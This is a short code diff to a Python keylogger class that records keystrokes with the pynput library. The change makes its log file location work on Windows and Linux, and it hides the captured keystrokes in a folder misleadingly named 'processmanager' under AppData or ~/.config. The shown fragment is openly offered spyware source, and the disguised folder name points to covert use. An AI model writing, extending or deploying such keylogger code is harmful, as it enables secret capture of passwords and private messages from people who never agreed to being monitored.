@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-from os import environ
+from os import environ, name
 from threading import Timer
 
 from pynput import keyboard
@@ -9,7 +9,13 @@ class KeyLogger:
 
     def __init__(self):
         self.log = ""
-        self.log_path = f'{environ["appdata"]}\\processmanager'
+        self.log_path = self.get_log_path()
+
+    @staticmethod
+    def get_log_path():
+        if name == "nt":
+            return f'{environ["AppData"]}\\processmanager'
+        return f'{environ["HOME"]}/.config/processmanager'
 
     def process_keys(self, key):
         try:
